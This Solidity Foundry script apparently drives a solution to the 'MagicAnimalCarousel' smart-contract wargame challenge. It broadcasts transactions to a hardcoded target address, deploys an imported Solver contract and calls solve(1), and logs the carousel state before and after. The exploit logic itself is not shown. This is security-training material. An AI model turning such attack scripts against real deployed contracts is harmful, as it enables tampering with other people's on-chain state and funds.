// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IMagicAnimalCarousel} from "src/IMagicAnimalCarousel.sol";
import {Solver} from "src/Solver.sol";

contract SolverScript is Script {

    IMagicAnimalCarousel target;
    Solver solver;

    function setUp() public {
        target = IMagicAnimalCarousel(0x16b4447C8975750c85b7F85bfeb371Ef3E811d2E);
    }

    function run() public {
        vm.startBroadcast();

        console.log("init carousel: ", target.carousel(1));
        target.setAnimalAndSpin("horse");
        console.log("first carousel: ");
        console.logBytes32(bytes32(target.carousel(1)));

        solver = new Solver(target);
        solver.solve(1);
        console.log("after carousel: ");
        console.logBytes32(bytes32(target.carousel(1)));
        console.log("current crate id: ", target.currentCrateId());

        vm.stopBroadcast();
    }
}
